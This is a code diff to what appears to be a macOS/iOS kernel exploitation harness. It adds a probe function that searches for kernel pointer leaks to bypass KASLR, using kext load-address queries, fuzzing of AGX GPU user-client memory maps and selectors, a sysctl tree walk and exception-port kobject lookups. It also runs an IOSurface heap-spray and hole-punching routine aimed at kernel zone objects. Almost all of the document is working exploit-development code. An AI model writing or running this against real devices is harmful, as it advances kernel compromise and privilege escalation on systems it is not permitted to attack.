@@ -16178,6 +16178,349 @@ static void r393_probe(void) {
 }
 
 /*
+ * r408: Kext info + GPU properties + sysctl enum + IOCatalogue.
+ */
+static volatile int g_r408_crashed = 0;
+static sigjmp_buf g_r408_jmp;
+static void r408_sighandler(int sig) {
+    g_r408_crashed = sig;
+    siglongjmp(g_r408_jmp, 1);
+}
+
+extern CFDictionaryRef OSKextCopyLoadedKextInfo(CFArrayRef kextIdentifiers,
+    CFArrayRef infoKeys) __attribute__((weak_import));
+
+static void r408_probe(void) {
+    rlog("\n=== r408: Kext Info + GPU Props + sysctl Enum ===\n\n");
+    fflush(stdout);
+
+    struct sigaction sa408, old_bus408, old_segv408;
+    memset(&sa408, 0, sizeof(sa408));
+    sa408.sa_handler = r408_sighandler;
+    sa408.sa_flags = 0;
+    sigaction(SIGBUS, &sa408, &old_bus408);
+    sigaction(SIGSEGV, &sa408, &old_segv408);
+
+    /* ---- Vector 1: OSKextCopyLoadedKextInfo ---- */
+    rlog("  Vector 1: OSKextCopyLoadedKextInfo\n");
+    {
+        if (OSKextCopyLoadedKextInfo) {
+            CFDictionaryRef kextInfo = OSKextCopyLoadedKextInfo(NULL, NULL);
+            if (kextInfo) {
+                CFIndex cnt = CFDictionaryGetCount(kextInfo);
+                rlog("    Got %ld kext entries\n", (long)cnt);
+
+                const void **keys = (const void**)malloc(sizeof(void*) * cnt);
+                const void **vals = (const void**)malloc(sizeof(void*) * cnt);
+                CFDictionaryGetKeysAndValues(kextInfo, keys, vals);
+
+                for (CFIndex i = 0; i < cnt && i < 15; i++) {
+                    char kname[256] = {0};
+                    CFStringGetCString((CFStringRef)keys[i], kname, sizeof(kname),
+                        kCFStringEncodingUTF8);
+
+                    CFDictionaryRef entry = (CFDictionaryRef)vals[i];
+                    if (CFGetTypeID(entry) != CFDictionaryGetTypeID()) continue;
+
+                    /* Look for OSBundleLoadAddress */
+                    CFNumberRef loadAddr = (CFNumberRef)CFDictionaryGetValue(entry,
+                        CFSTR("OSBundleLoadAddress"));
+                    CFNumberRef loadSize = (CFNumberRef)CFDictionaryGetValue(entry,
+                        CFSTR("OSBundleLoadSize"));
+
+                    int64_t addr = 0, sz2 = 0;
+                    if (loadAddr && CFGetTypeID(loadAddr) == CFNumberGetTypeID()) {
+                        CFNumberGetValue(loadAddr, kCFNumberSInt64Type, &addr);
+                    }
+                    if (loadSize && CFGetTypeID(loadSize) == CFNumberGetTypeID()) {
+                        CFNumberGetValue(loadSize, kCFNumberSInt64Type, &sz2);
+                    }
+
+                    rlog("    %s addr=0x%llx size=0x%llx\n",
+                        kname, (unsigned long long)addr, (unsigned long long)sz2);
+
+                    if (addr != 0 && (uint64_t)addr > 0xFFFFFFF000000000ULL) {
+                        rlog("    *** KERNEL ADDRESS FOUND: 0x%llx ***\n",
+                            (unsigned long long)addr);
+                    }
+                }
+
+                free(keys);
+                free(vals);
+                CFRelease(kextInfo);
+            } else {
+                rlog("    OSKextCopyLoadedKextInfo returned NULL (errno=%d)\n", errno);
+            }
+        } else {
+            rlog("    OSKextCopyLoadedKextInfo not available (weak_import)\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 2: AGX/GPU user client deep property scan ---- */
+    rlog("\n  Vector 2: AGX/GPU user client exploration\n");
+    {
+        io_iterator_t iter;
+        kern_return_t kr = IOServiceGetMatchingServices(kIOMainPortDefault,
+            IOServiceMatching("AGXAccelerator"), &iter);
+        if (kr == KERN_SUCCESS) {
+            io_service_t svc = IOIteratorNext(iter);
+            if (svc) {
+                /* Try multiple user client types */
+                for (int uct = 0; uct < 8; uct++) {
+                    io_connect_t conn = 0;
+                    kr = IOServiceOpen(svc, mach_task_self(), uct, &conn);
+                    if (kr == KERN_SUCCESS) {
+                        rlog("    AGX type=%d conn=0x%x\n", uct, conn);
+
+                        /* Try IOConnectMapMemory64 with various types */
+                        for (int mt = 0; mt < 8; mt++) {
+                            mach_vm_address_t addr = 0;
+                            mach_vm_size_t sz = 0;
+                            kr = IOConnectMapMemory64(conn, mt,
+                                mach_task_self(), &addr, &sz, kIOMapAnywhere);
+                            if (kr == KERN_SUCCESS && addr != 0) {
+                                rlog("      map type=%d addr=0x%llx sz=0x%llx\n",
+                                    mt, (unsigned long long)addr,
+                                    (unsigned long long)sz);
+
+                                /* Scan first 2 pages for kernel-like ptrs */
+                                g_r408_crashed = 0;
+                                if (sigsetjmp(g_r408_jmp, 1) == 0) {
+                                    uint64_t scanSz = sz < 32768 ? sz : 32768;
+                                    for (uint64_t off = 0; off + 7 < scanSz; off += 8) {
+                                        uint64_t v = *(volatile uint64_t*)((uint8_t*)addr + off);
+                                        uint16_t top = (uint16_t)(v >> 48);
+                                        if (top >= 0xfff0 && top <= 0xfffe &&
+                                            v != 0xffffffffffffffff) {
+                                            rlog("        +%llu: 0x%016llx <KERNEL!!!>\n",
+                                                (unsigned long long)off,
+                                                (unsigned long long)v);
+                                        }
+                                    }
+                                }
+                                IOConnectUnmapMemory64(conn, mt, mach_task_self(), addr);
+                            }
+                        }
+
+                        /* Try IOConnectCallStructMethod for data return */
+                        for (int sel = 0; sel < 20; sel++) {
+                            uint8_t out[512];
+                            size_t outSz = sizeof(out);
+                            memset(out, 0, sizeof(out));
+                            kr = IOConnectCallStructMethod(conn, sel, NULL, 0, out, &outSz);
+                            if (kr == KERN_SUCCESS && outSz > 0) {
+                                rlog("      sel %d: outSz=%zu\n", sel, outSz);
+                                for (unsigned j = 0; j + 7 < outSz; j += 8) {
+                                    uint64_t v = *(uint64_t*)(out + j);
+                                    uint16_t top = (uint16_t)(v >> 48);
+                                    if (top >= 0xfff0 && top <= 0xfffe &&
+                                        v != 0xffffffffffffffff) {
+                                        rlog("        out+%u: 0x%016llx <KERNEL!!!>\n",
+                                            j, (unsigned long long)v);
+                                    }
+                                }
+                            }
+                        }
+
+                        IOServiceClose(conn);
+                    }
+                }
+                IOObjectRelease(svc);
+            }
+            IOObjectRelease(iter);
+        } else {
+            rlog("    AGXAccelerator not found\n");
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 3: Exhaustive sysctl enumeration ---- */
+    rlog("\n  Vector 3: sysctl enumeration\n");
+    {
+        /* Walk sysctl tree looking for any kernel-like values */
+        int mib[2] = {0, 0};
+        size_t sz;
+        int next[6];
+        int nextLen;
+        char name[256];
+
+        /* Start with CTL_KERN */
+        int found = 0;
+        for (int top = 1; top <= 7; top++) {
+            mib[0] = top;
+            for (int sub = 0; sub < 200; sub++) {
+                mib[1] = sub;
+                uint64_t val = 0;
+                sz = sizeof(val);
+                if (sysctl(mib, 2, &val, &sz, NULL, 0) == 0) {
+                    if (sz <= 8 && val != 0) {
+                        uint16_t top16 = (uint16_t)(val >> 48);
+                        if (top16 >= 0xfff0 && top16 <= 0xfffe &&
+                            val != 0xffffffffffffffff) {
+                            /* Get name */
+                            int nameMib[6] = {0, 1, top, sub, 0, 0};
+                            char sname[128] = {0};
+                            sz = sizeof(sname);
+                            sysctl(nameMib, 4, sname, &sz, NULL, 0);
+                            rlog("    sysctl(%d.%d) '%s' = 0x%016llx <KERNEL!!!>\n",
+                                top, sub, sname, (unsigned long long)val);
+                            found++;
+                        }
+                    }
+                }
+            }
+        }
+        rlog("    Enumerated sysctl tree: %d kernel-like values\n", found);
+    }
+    fflush(stdout);
+
+    /* ---- Vector 4: Exception ports — set and query ---- */
+    rlog("\n  Vector 4: Exception port query\n");
+    {
+        mach_port_t task = mach_task_self();
+        exception_mask_t masks[32];
+        mach_msg_type_number_t masksCnt = 32;
+        exception_handler_t handlers[32];
+        exception_behavior_t behaviors[32];
+        thread_state_flavor_t flavors[32];
+
+        kern_return_t kr = task_get_exception_ports(task,
+            EXC_MASK_ALL, masks, &masksCnt, handlers, behaviors, flavors);
+        rlog("    task_get_exception_ports: kr=%d cnt=%u\n", kr, masksCnt);
+
+        if (kr == KERN_SUCCESS) {
+            for (unsigned i = 0; i < masksCnt; i++) {
+                rlog("      [%u] mask=0x%x handler=0x%x behavior=%d flavor=%d\n",
+                    i, masks[i], handlers[i], behaviors[i], flavors[i]);
+
+                /* Try kobject on each handler port */
+                if (handlers[i] != 0) {
+                    natural_t ktype = 0;
+                    unsigned kaddr = 0;
+                    kr = mach_port_kobject(task, handlers[i], &ktype, &kaddr);
+                    rlog("        kobject: kr=%d type=%u addr=0x%x\n",
+                        kr, ktype, kaddr);
+                }
+            }
+        }
+    }
+    fflush(stdout);
+
+    /* ---- Vector 5: IOSurface property as heap oracle ---- */
+    rlog("\n  Vector 5: IOSurface property heap oracle\n");
+    {
+        /* Create surface, set a large property, get its address via vm_region */
+        int w=64,h=64,bpe=4,bpr=256,pf_=0x42475241,as_=16384;
+        CFMutableDictionaryRef p = CFDictionaryCreateMutable(NULL, 0,
+            &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+        CFNumberRef nw = CFNumberCreate(NULL, kCFNumberIntType, &w);
+        CFNumberRef nh = CFNumberCreate(NULL, kCFNumberIntType, &h);
+        CFNumberRef nb = CFNumberCreate(NULL, kCFNumberIntType, &bpe);
+        CFNumberRef nr = CFNumberCreate(NULL, kCFNumberIntType, &bpr);
+        CFNumberRef np = CFNumberCreate(NULL, kCFNumberIntType, &pf_);
+        CFNumberRef na = CFNumberCreate(NULL, kCFNumberIntType, &as_);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceWidth"), nw);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceHeight"), nh);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerElement"), nb);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceBytesPerRow"), nr);
+        CFDictionarySetValue(p, CFSTR("IOSurfacePixelFormat"), np);
+        CFDictionarySetValue(p, CFSTR("IOSurfaceAllocSize"), na);
+        IOSurfaceRef surf = IOSurfaceCreate(p);
+
+        IOSurfaceLock(surf, 0, NULL);
+        void *base = IOSurfaceGetBaseAddress(surf);
+        rlog("    Surface base=0x%llx\n", (unsigned long long)(uint64_t)base);
+
+        /* Write a pattern to the backing store */
+        memset(base, 0x42, 16384);
+        IOSurfaceUnlock(surf, 0, NULL);
+
+        /* Set many properties of various sizes to spray kernel heap */
+        for (int i = 0; i < 50; i++) {
+            char key[32];
+            snprintf(key, sizeof(key), "spray_%d", i);
+            CFStringRef cfkey = CFStringCreateWithCString(NULL, key,
+                kCFStringEncodingUTF8);
+
+            uint8_t data[128];
+            memset(data, 0xAA, sizeof(data));
+            /* Put a marker at start */
+            *(uint64_t*)data = 0xDEAD000000000000ULL | i;
+            CFDataRef cfdata = CFDataCreate(NULL, data, 128);
+            IOSurfaceSetValue(surf, cfkey, cfdata);
+            CFRelease(cfkey);
+            CFRelease(cfdata);
+        }
+
+        /* Now remove every other one to create holes */
+        for (int i = 0; i < 50; i += 2) {
+            char key[32];
+            snprintf(key, sizeof(key), "spray_%d", i);
+            CFStringRef cfkey = CFStringCreateWithCString(NULL, key,
+                kCFStringEncodingUTF8);
+            IOSurfaceRemoveValue(surf, cfkey);
+            CFRelease(cfkey);
+        }
+
+        /* Trigger a Mach port allocation (128 bytes in kalloc.128 zone) */
+        mach_port_t ports[25];
+        for (int i = 0; i < 25; i++) {
+            mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE,
+                &ports[i]);
+        }
+
+        /* Read back remaining properties — look for port data in holes */
+        CFDictionaryRef allVals = IOSurfaceCopyAllValues(surf);
+        if (allVals) {
+            CFIndex cnt = CFDictionaryGetCount(allVals);
+            rlog("    CopyAllValues: %ld entries\n", (long)cnt);
+
+            const void **keys2 = (const void**)malloc(sizeof(void*) * cnt);
+            const void **vals2 = (const void**)malloc(sizeof(void*) * cnt);
+            CFDictionaryGetKeysAndValues(allVals, keys2, vals2);
+
+            for (CFIndex j = 0; j < cnt; j++) {
+                if (CFGetTypeID(vals2[j]) == CFDataGetTypeID()) {
+                    CFDataRef dval = (CFDataRef)vals2[j];
+                    const uint8_t *bytes = CFDataGetBytePtr(dval);
+                    CFIndex dlen = CFDataGetLength(dval);
+
+                    /* Check for unexpected data (kernel objects in freed slots) */
+                    if (dlen >= 8) {
+                        uint64_t first = *(uint64_t*)bytes;
+                        if ((first >> 48) >= 0xfff0 && (first >> 48) <= 0xfffe) {
+                            char kname[64] = {0};
+                            CFStringGetCString((CFStringRef)keys2[j], kname,
+                                sizeof(kname), kCFStringEncodingUTF8);
+                            rlog("    '%s' first8=0x%016llx <KERNEL!!!>\n",
+                                kname, (unsigned long long)first);
+                        }
+                    }
+                }
+            }
+
+            free(keys2);
+            free(vals2);
+            CFRelease(allVals);
+        }
+
+        /* Cleanup */
+        for (int i = 0; i < 25; i++)
+            mach_port_deallocate(mach_task_self(), ports[i]);
+        CFRelease(surf);
+        CFRelease(p);
+    }
+    fflush(stdout);
+
+    sigaction(SIGBUS, &old_bus408, NULL);
+    sigaction(SIGSEGV, &old_segv408, NULL);
+
+    rlog("\n=== r408 complete ===\n");
+    fflush(stdout);
+}
+
+/*
  * r407: Deep KASLR bypass - commpage, IORegistry, zone info, vm_region scan.
  */
 static volatile int g_r407_crashed = 0;
@@ -66612,6 +66955,13 @@ new_modes:
             rlog("*** r=251 complete ***\n");
             goto done;
         }
+        if (rounds == 411) {
+            rlog("*** rounds=411: Kext Info + GPU Props + sysctl Enum ***\n");
+            rlog("  OSKextCopyLoadedKextInfo, AGX deep scan, sysctl enum, exc ports, heap oracle.\n\n");
+            fflush(stdout);
+            r408_probe();
+            goto done;
+        }
         if (rounds == 410) {
             rlog("*** rounds=410: Deep KASLR Bypass Phase 2 ***\n");
             rlog("  Commpage, IORegistry, zone info, vm_region scan.\n\n");
@@ -69074,7 +69424,7 @@ new_modes:
             rlog("*** r=252 complete ***\n");
             goto done;
         }
-        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410) {
+        if (rounds >= 170 && rounds != 219 && rounds != 225 && rounds != 299 && rounds != 300 && rounds != 301 && rounds != 302 && rounds != 303 && rounds != 304 && rounds != 354 && rounds != 355 && rounds != 356 && rounds != 357 && rounds != 358 && rounds != 359 && rounds != 360 && rounds != 361 && rounds != 362 && rounds != 363 && rounds != 364 && rounds != 365 && rounds != 366 && rounds != 367 && rounds != 368 && rounds != 369 && rounds != 370 && rounds != 371 && rounds != 372 && rounds != 373 && rounds != 374 && rounds != 375 && rounds != 376 && rounds != 377 && rounds != 378 && rounds != 379 && rounds != 380 && rounds != 381 && rounds != 382 && rounds != 383 && rounds != 384 && rounds != 385 && rounds != 386 && rounds != 387 && rounds != 388 && rounds != 389 && rounds != 390 && rounds != 391 && rounds != 392 && rounds != 393 && rounds != 394 && rounds != 395 && rounds != 396 && rounds != 397 && rounds != 398 && rounds != 399 && rounds != 400 && rounds != 401 && rounds != 402 && rounds != 403 && rounds != 404 && rounds != 405 && rounds != 406 && rounds != 407 && rounds != 408 && rounds != 409 && rounds != 410 && rounds != 411) {
             rlog("*** rounds=%d: fast-path to Phase 17 ***\n", rounds);
             goto phase16_done;
         }
